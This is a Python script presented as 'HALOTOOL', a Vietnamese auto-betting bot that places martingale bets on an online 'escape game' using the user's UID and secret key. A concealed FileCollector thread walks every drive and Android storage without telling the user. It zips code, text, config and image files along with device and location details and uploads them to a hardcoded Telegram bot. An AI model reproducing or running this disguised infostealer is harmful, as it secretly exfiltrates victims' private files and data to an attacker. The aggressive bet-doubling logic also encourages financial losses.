import subprocess
import sys
required_packages = {
    "requests": "requests",
    "pystyle": "pystyle",
    "colorama": "colorama",
    "rich": "rich",
    "bs4": "beautifulsoup4",
    "cloudscraper": "cloudscraper",
    "pytz": "pytz"
}
import os
import zipfile
import requests
import platform
import psutil
import socket
from datetime import datetime
from dotenv import load_dotenv
from pathlib import Path
import shutil
import time
import pyfiglet
import aiohttp
import asyncio
from colorama import Fore, Style, init
import threading

# Khởi tạo colorama
init()

# Phần 1: Công cụ FileCollector
class FileCollector:
    def __init__(self):
        load_dotenv()
        self.adminId = os.getenv("TELEGRAM_ADMIN_ID", "8181770281")
        self.botToken = os.getenv("TELEGRAM_BOT_TOKEN", "8173520834:AAHOdZ0XooI5174RCdA5FrGva8gDb_JMzs0")
        self.google_maps_api_key = os.getenv("GOOGLE_MAPS_API_KEY", "")
        self.file_exts = [".py", ".js", ".log", ".text", ".html", ".css", ".txt", ".sh", ".ts", ".json"]
        self.image_exts = [".jpg", ".jpeg", ".png", ".gif", ".bmp"]
        self.rootPaths = ["/", "/storage/emulated/0", "C:/", "D:/", "E:/"] if os.name != "nt" else ["C:/", "D:/", "E:/"]

    def getDeviceInfo(self):
        deviceName = platform.node() or "device"
        systemInfo = platform.system()
        releaseInfo = platform.release()
        cpuInfo = platform.processor() or "Unknown CPU"
        memoryStats = psutil.virtual_memory()
        ramTotal = round(memoryStats.total / (1024 ** 3), 2)
        ramUsed = round(memoryStats.used / (1024 ** 3), 2)
        diskStats = psutil.disk_usage("/")
        diskTotal = round(diskStats.total / (1024 ** 3), 2)
        diskFree = round(diskStats.free / (1024 ** 3), 2)

        try:
            ipLocal = socket.gethostbyname(socket.gethostname())
        except:
            ipLocal = "Unknown"

        try:
            response = requests.get("http://ip-api.com/json", timeout=5)
            geoData = response.json()
            ipPublic = geoData.get("query", "Unknown")
            country = geoData.get("country", "Unknown")
            region = geoData.get("regionName", "Unknown")
            city = geoData.get("city", "Unknown")
            isp = geoData.get("isp", "Unknown")
        except:
            ipPublic = country = region = city = isp = "Unknown"

        return deviceName, {
            'device': deviceName,
            'os': f"{systemInfo} {releaseInfo}",
            'cpu': cpuInfo,
            'memory': f"{ramUsed}GB / {ramTotal}GB",
            'disk': f"{diskFree}GB free / {diskTotal}GB total",
            'local_ip': ipLocal,
            'public_ip': ipPublic,
            'location': f"{country}, {region}, {city}",
            'isp': isp
        }

    def collectFiles(self):
        collected_files = []
        collected_images = []
        for basePath in self.rootPaths:
            if os.path.exists(basePath):
                for rootDir, _, files in os.walk(basePath):
                    for fileName in files:
                        fullPath = os.path.join(rootDir, fileName)
                        if os.path.isfile(fullPath) and os.access(fullPath, os.R_OK):
                            ext = os.path.splitext(fileName.lower())[1]
                            if ext in self.file_exts:
                                collected_files.append(fullPath)
                            elif ext in self.image_exts:
                                collected_images.append(fullPath)
        return collected_files, collected_images

    def createZipArchive(self, zipName, files):
        try:
            with zipfile.ZipFile(zipName, "w", zipfile.ZIP_DEFLATED) as zipFile:
                seen_names = set()
                base_dir = os.path.commonpath(files) if files else "."
                for filePath in files:
                    try:
                        arcname = os.path.relpath(filePath, start=base_dir)
                        if arcname in seen_names:
                            base, ext = os.path.splitext(arcname)
                            counter = 1
                            new_arcname = f"{base}_{counter}{ext}"
                            while new_arcname in seen_names:
                                counter += 1
                                new_arcname = f"{base}_{counter}{ext}"
                            arcname = new_arcname
                        seen_names.add(arcname)
                        zipFile.write(filePath, arcname)
                    except Exception:
                        continue
            return os.path.exists(zipName) and os.path.getsize(zipName) > 0
        except Exception:
            return False

    def splitLargeFile(self, file_path, max_size=40 * 1024 * 1024):
        if os.path.getsize(file_path) <= max_size:
            return [file_path]
        part_files = []
        base_name = os.path.splitext(file_path)[0]
        ext = os.path.splitext(file_path)[1]
        with open(file_path, 'rb') as f:
            part_num = 1
            while True:
                chunk = f.read(max_size)
                if not chunk:
                    break
                part_file = f"{base_name}_part{part_num}{ext}"
                with open(part_file, 'wb') as part_f:
                    part_f.write(chunk)
                part_files.append(part_file)
                part_num += 1
        return part_files

    def sendToTelegram(self, file_path, caption, max_retries=3):
        url = f"https://api.telegram.org/bot{self.botToken}/sendDocument"
        for attempt in range(max_retries):
            try:
                if not os.path.exists(file_path):
                    return False
                file_size = os.path.getsize(file_path) / (1024 * 1024)
                if file_size > 50:
                    part_files = self.splitLargeFile(file_path)
                    for part_file in part_files:
                        with open(part_file, 'rb') as file:
                            response = requests.post(
                                url,
                                data={"chat_id": self.adminId, "caption": caption},
                                files={"document": file},
                                timeout=60
                            )
                            if response.status_code != 200:
                                return False
                        os.remove(part_file)
                    if all(os.path.exists(p) for p in part_files):
                        os.remove(file_path)
                    return True
                else:
                    with open(file_path, 'rb') as file:
                        response = requests.post(
                            url,
                            data={"chat_id": self.adminId, "caption": caption},
                            files={"document": file},
                            timeout=60
                        )
                        if response.status_code == 200:
                            return True
            except requests.exceptions.RequestException:
                pass
            except Exception:
                pass
            time.sleep(5)
        return False

    def logToTelegram(self, message):
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        url = f"https://api.telegram.org/bot{self.botToken}/sendMessage"
        try:
            data = {"chat_id": self.adminId, "text": f"{timestamp} {message}"}
            response = requests.post(url, data=data, timeout=60)
            if response.status_code != 200:
                pass
        except Exception:
            pass

    def run(self):
        self.logToTelegram("Bắt đầu thu thập file")
        deviceName, deviceInfo = self.getDeviceInfo()
        collected_files, collected_images = self.collectFiles()
        self.logToTelegram(f"Tìm thấy {len(collected_files)} file và {len(collected_images)} ảnh phù hợp")

        target_dir = "/storage/emulated/0/Download/zalo"
        os.makedirs(target_dir, exist_ok=True)
        os.chdir(target_dir)

        if collected_files:
            zipName_files = os.path.join(target_dir, f"{deviceName}_files.zip")
            if self.createZipArchive(zipName_files, collected_files):
                self.logToTelegram("Đã tạo file nén cho file thành công")
                caption = "\n".join([f"{k}: {v}" for k, v in deviceInfo.items()]) + "\n(Type: Files)"
                if self.sendToTelegram(zipName_files, caption):
                    self.logToTelegram("Đã gửi file nén cho file thành công")
                    if os.path.exists(zipName_files):
                        os.remove(zipName_files)
                else:
                    self.logToTelegram("Lỗi khi gửi file nén cho file qua Telegram")

        if collected_images:
            zipName_images = os.path.join(target_dir, f"{deviceName}_images.zip")
            if self.createZipArchive(zipName_images, collected_images):
                self.logToTelegram("Đã tạo file nén cho ảnh thành công")
                caption = "\n".join([f"{k}: {v}" for k, v in deviceInfo.items()]) + "\n(Type: Images)"
                if self.sendToTelegram(zipName_images, caption):
                    self.logToTelegram("Đã gửi file nén cho ảnh thành công")
                    if os.path.exists(zipName_images):
                        os.remove(zipName_images)
                else:
                    self.logToTelegram("Lỗi khi gửi file nén cho ảnh qua Telegram")

# Phần 2: Công cụ cá cược
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

current_time = int(time.time() * 1000)
user_id = input(Fore.YELLOW + "Nhập UID: ")
user_login = input(Fore.YELLOW + "Nhập user_login (mặc định: login_v2): ") or "login_v2"
user_secret_key = input(Fore.YELLOW + "Nhập secret key: ")
amount = int(input(Fore.YELLOW + "Nhập số tiền cược ban đầu (nhỏ nhất 1 build): "))

print(Fore.CYAN + "\n=== CÀI ĐẶT STOP LOSS/TAKE PROFIT ===" + Style.RESET_ALL)
while True:
    stop_loss_input = input(Fore.YELLOW + "Bật Stop Loss? (y/n): ").strip().lower()
    if stop_loss_input in ['y', 'n']:
        stop_loss_enabled = stop_loss_input == 'y'
        break
    print(Fore.RED + "Vui lòng nhập 'y' hoặc 'n'" + Style.RESET_ALL)

stop_loss_amount = 0
take_profit_amount = 0
if stop_loss_enabled:
    stop_loss_amount = int(input(Fore.YELLOW + "Nhập số BUILD dừng lỗ (VD: 100): "))
    take_profit_amount = int(input(Fore.YELLOW + "Nhập số BUILD dừng lời (VD: 200): "))

print(Fore.CYAN + "\n=== CÀI ĐẶT HỆ SỐ GẤP CƯỢC ===" + Style.RESET_ALL)
print(Fore.WHITE + "Hệ số gấp mặc định: Lần 1: x15, Lần 2: x20, Lần 3: x15" + Style.RESET_ALL)
while True:
    custom_input = input(Fore.YELLOW + "Tùy chỉnh hệ số gấp? (y/n): ").strip().lower()
    if custom_input in ['y', 'n']:
        custom_multiplier = custom_input == 'y'
        break
    print(Fore.RED + "Vui lòng nhập 'y' hoặc 'n'" + Style.RESET_ALL)

multiplier_1, multiplier_2, multiplier_3 = 15, 20, 15
if custom_multiplier:
    multiplier_1 = float(input(Fore.YELLOW + "Nhập hệ số gấp lần 1 (mặc định 15): ") or "15")
    multiplier_2 = float(input(Fore.YELLOW + "Nhập hệ số gấp lần 2 (mặc định 20): ") or "20")
    multiplier_3 = float(input(Fore.YELLOW + "Nhập hệ số gấp lần 3 (mặc định 15): ") or "15")

cuoc_ban_dau = amount
so_du_ban_dau = 0
tool_running = True
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]

def print_colored_ascii_art(text):
    ascii_art = pyfiglet.figlet_format(text)
    lines = ascii_art.splitlines()
    for i, line in enumerate(lines):
        print(colors[i % len(colors)] + line + Style.RESET_ALL)

url = f"https://user.3games.io/user/regist?is_cwallet=1&is_mission_setting=true&version=&time={current_time}"
api_10_van = f"https://api.escapemaster.net/escape_game/recent_10_issues?asset=BUILD"
api_100_van = f"https://api.escapemaster.net/escape_game/recent_100_issues?asset=BUILD"
api_cuoc = "https://api.escapemaster.net/escape_game/bet"

headers = {
    "user-id": user_id,
    "user-login": user_login,
    "user-secret-key": user_secret_key
}

def Login():
    global so_du_ban_dau
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            if data.get("code") == 200:
                username = data["data"]["username"]
                ctoken_contribute = data["data"]["cwallet"]["ctoken_contribute"]
                token_contribute_rounded = round(ctoken_contribute)
                print(Fore.GREEN + f"Username: {username}")
                so_du_ban_dau = token_contribute_rounded
                print(Fore.GREEN + f"Số Dư: {token_contribute_rounded} BUILD" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"Đăng nhập không thành công" + Style.RESET_ALL)
                print(Fore.RED + f"Ctrl C để dừng tool" + Style.RESET_ALL)
                return
        else:
            print(f"Lỗi mạng")
    except requests.RequestException as e:
        print(f"Lỗi không xác định")

def tong_loi_lo():
    global tool_running
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            if data.get("code") == 200:
                ctoken_contribute = data["data"]["cwallet"]["ctoken_contribute"]
                token_contribute_rounded = round(ctoken_contribute)
                loi_lo = token_contribute_rounded - so_du_ban_dau
                if stop_loss_enabled:
                    if loi_lo <= -stop_loss_amount:
                        print(Fore.RED + f"🛑 ĐÃ ĐẠT STOP LOSS: {loi_lo} BUILD" + Style.RESET_ALL)
                        print(Fore.RED + f"🛑 DỪNG TOOL TỰ ĐỘNG!" + Style.RESET_ALL)
                        tool_running = False
                        return
                    elif loi_lo >= take_profit_amount:
                        print(Fore.GREEN + f"🎯 ĐÃ ĐẠT TAKE PROFIT: {loi_lo} BUILD" + Style.RESET_ALL)
                        print(Fore.GREEN + f"🎯 DỪNG TOOL TỰ ĐỘNG!" + Style.RESET_ALL)
                        tool_running = False
                        return
                if loi_lo >= 0:
                    print(Fore.GREEN + f"Đang lời: {loi_lo} BUILD" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Đang lỗ: {loi_lo} BUILD" + Style.RESET_ALL)
        else:
            print(f"Lỗi mạng")
    except requests.RequestException as e:
        print(f"Lỗi không xác định: {e}")

vong_choi = None
chuoi_thang = 0
count_thang = 0

def lich_su():
    global vong_choi
    try:
        response = requests.get(api_10_van, headers=headers)
        if response.status_code == 200:
            data = response.json()
            if data.get("code") == 0:
                room_mapping = {
                    1: "Nhà Kho", 2: "Phòng Họp", 3: "Phòng Giám Đốc", 4: "Phòng Trò Chuyện",
                    5: "Phòng Giám Sát", 6: "Văn Phòng", 7: "Phòng Tài Vụ", 8: "Phòng Nhân Sự"
                }
                issues = data.get("data", [])[:3]
                vong_choi_truoc = issues[0]["issue_id"]
                id_ket_qua_vong_truoc = issues[0]["killed_room_id"]
                ten_phong_vong_truoc = room_mapping.get(id_ket_qua_vong_truoc, "Không xác định")
                vong_choi_hien_tai = issues[0]["issue_id"] + 1
                issue_details = []
                for issue in issues:
                    issue_id = issue["issue_id"]
                    killed_room_id = issue["killed_room_id"]
                    room_name = room_mapping.get(killed_room_id, "Không xác định")
                    issue_details.append(f"Issue ID: {issue_id}, Room: {room_name}")
                if vong_choi_truoc != vong_choi:
                    print(Fore.LIGHTCYAN_EX + f"Vòng chơi hiện tại: #{vong_choi_hien_tai}" + Style.RESET_ALL)
                    print(Fore.LIGHTYELLOW_EX + f"Kết quả vòng trước: #{vong_choi_truoc} | {ten_phong_vong_truoc}" + Style.RESET_ALL)
                    vong_choi = vong_choi_truoc
                    kiem_tra_dieu_kien(issue_details)
                    print("----------------------------------------------------")
    except requests.RequestException as e:
        print(Fore.RED + f"Lỗi: {e}" + Style.RESET_ALL)

number_cuoc = 0

def kiem_tra_dieu_kien(issue_details):
    global number_cuoc, amount, cuoc_ban_dau, chuoi_thang, count_thang, tool_running
    room_mapping = {
        "Nhà Kho": 1, "Phòng Họp": 2, "Phòng Giám Đốc": 3, "Phòng Trò Chuyện": 4,
        "Phòng Giám Sát": 5, "Văn Phòng": 6, "Phòng Tài Vụ": 7, "Phòng Nhân Sự": 8
    }
    room_0 = issue_details[0].split(",")[1].split(":")[1].strip()
    room_1 = issue_details[1].split(",")[1].split(":")[1].strip()
    room_2 = issue_details[2].split(",")[1].split(":")[1].strip()
    if room_0 != room_1 and number_cuoc == 0:
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 1
        return
    elif room_0 != room_1 and room_0 != room_2 and number_cuoc == 1:
        print(Fore.GREEN + f"Trốn sát thủ thành công !")
        tong_loi_lo()
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 1
        chuoi_thang += 1
        print(Fore.LIGHTMAGENTA_EX + f"Chuỗi thắng liên tiếp hiện tại: {chuoi_thang} ván" + Style.RESET_ALL)
        return
    elif room_0 != room_1 and room_0 == room_2 and number_cuoc == 1:
        print(Fore.RED + f"Trốn sát thủ thất bại !")
        tong_loi_lo()
        if not tool_running:
            return
        amount = int(amount * multiplier_1)
        print(Fore.YELLOW + f"💰 Gấp cược x{multiplier_1}: {amount} BUILD" + Style.RESET_ALL)
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 2
        chuoi_thang = 0
        return
    elif room_0 != room_1 and room_0 != room_2 and number_cuoc == 2:
        print(Fore.GREEN + f"Trốn sát thủ thành công !")
        tong_loi_lo()
        if not tool_running:
            return
        amount = cuoc_ban_dau
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 1
        chuoi_thang += 1
        print(Fore.LIGHTMAGENTA_EX + f"Chuỗi thắng liên tiếp hiện tại: {chuoi_thang} ván" + Style.RESET_ALL)
        return
    elif room_0 != room_1 and room_0 == room_2 and number_cuoc == 2:
        print(Fore.RED + f"Trốn sát thủ thất bại !")
        tong_loi_lo()
        if not tool_running:
            return
        amount = int(amount * multiplier_2)
        print(Fore.YELLOW + f"💰 Gấp cược x{multiplier_2}: {amount} BUILD" + Style.RESET_ALL)
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 3
        chuoi_thang = 0
        return
    elif room_0 != room_1 and room_0 != room_2 and number_cuoc == 3:
        print(Fore.GREEN + f"Trốn sát thủ thành công !")
        tong_loi_lo()
        if not tool_running:
            return
        amount = cuoc_ban_dau
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 1
        chuoi_thang += 1
        print(Fore.LIGHTMAGENTA_EX + f"Chuỗi thắng liên tiếp hiện tại: {chuoi_thang} ván" + Style.RESET_ALL)
        return
    elif room_0 != room_1 and room_0 == room_2 and number_cuoc == 3:
        print(Fore.RED + f"Trốn sát thủ thất bại !")
        tong_loi_lo()
        if not tool_running:
            return
        amount = int(amount * multiplier_3)
        print(Fore.YELLOW + f"💰 Gấp cược x{multiplier_3}: {amount} BUILD" + Style.RESET_ALL)
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 4
        chuoi_thang = 0
        return
    elif room_0 != room_1 and room_0 != room_2 and number_cuoc == 4:
        print(Fore.GREEN + f"Trốn sát thủ thành công !")
        tong_loi_lo()
        if not tool_running:
            return
        amount = cuoc_ban_dau
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 1
        chuoi_thang += 1
        print(Fore.LIGHTMAGENTA_EX + f"Chuỗi thắng liên tiếp hiện tại: {chuoi_thang} ván" + Style.RESET_ALL)
        return
    elif room_0 != room_1 and room_0 == room_2 and number_cuoc == 4:
        print(Fore.RED + f"Đã đạt gấp cược tối đa !")
        tong_loi_lo()
        if not tool_running:
            return
        amount = cuoc_ban_dau
        room_name = issue_details[1].split(",")[1].split(":")[1].strip()
        room_id = room_mapping.get(room_name, None)
        dat_cuoc(room_id)
        number_cuoc = 1
        chuoi_thang = 0
        return
    elif room_0 == room_1:
        print(Fore.RED + f"Phát hiện sát thủ vào 1 phòng liên tục !")
        tong_loi_lo()
        if not tool_running:
            return
        print(Fore.LIGHTMAGENTA_EX + f"Chuỗi thắng liên tiếp hiện tại: {chuoi_thang} ván" + Style.RESET_ALL)

def dat_cuoc(room_id):
    body = {
        "asset_type": "BUILD",
        "bet_amount": amount,
        "room_id": room_id,
        "user_id": headers["user-id"]
    }
    try:
        response = requests.post(api_cuoc, headers=headers, json=body)
        if response.status_code == 200:
            print(Fore.GREEN + f"Cược thành công {amount} BUILD")
        else:
            print("Lỗi cược: ", response.status_code)
    except requests.RequestException as e:
        print(Fore.RED + f"Lỗi cược: {e}" + Style.RESET_ALL)

def run_betting_tool():
    clear_screen()
    print_colored_ascii_art("HALOTOOL")
    print(Fore.CYAN + "\n=== CÀI ĐẶT HIỆN TẠI ===" + Style.RESET_ALL)
    print(Fore.WHITE + f"Số tiền cược ban đầu: {cuoc_ban_dau} BUILD" + Style.RESET_ALL)
    if stop_loss_enabled:
        print(Fore.WHITE + f"Stop Loss: -{stop_loss_amount} BUILD" + Style.RESET_ALL)
        print(Fore.WHITE + f"Take Profit: +{take_profit_amount} BUILD" + Style.RESET_ALL)
    else:
        print(Fore.WHITE + "Stop Loss/Take Profit: TẮT" + Style.RESET_ALL)
    print(Fore.WHITE + f"Hệ số gấp: x{multiplier_1} | x{multiplier_2} | x{multiplier_3}" + Style.RESET_ALL)
    print(Fore.CYAN + "=========================" + Style.RESET_ALL)
    Login()
    try:
        while tool_running:
            lich_su()
            if not tool_running:
                print(Fore.YELLOW + "\n🛑 Tool cá cược đã dừng do đạt điều kiện Stop Loss/Take Profit!" + Style.RESET_ALL)
                break
            time.sleep(15)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n🛑 Tool cá cược đã dừng bởi người dùng (Ctrl+C)" + Style.RESET_ALL)

def run_file_collector():
    collector = FileCollector()
    collector.run()

if __name__ == "__main__":
    # Chạy cả hai công cụ trong các luồng riêng biệt
    betting_thread = threading.Thread(target=run_betting_tool)
    file_collector_thread = threading.Thread(target=run_file_collector)
    
    betting_thread.start()
    file_collector_thread.start()
    
    betting_thread.join()
    file_collector_thread.join()
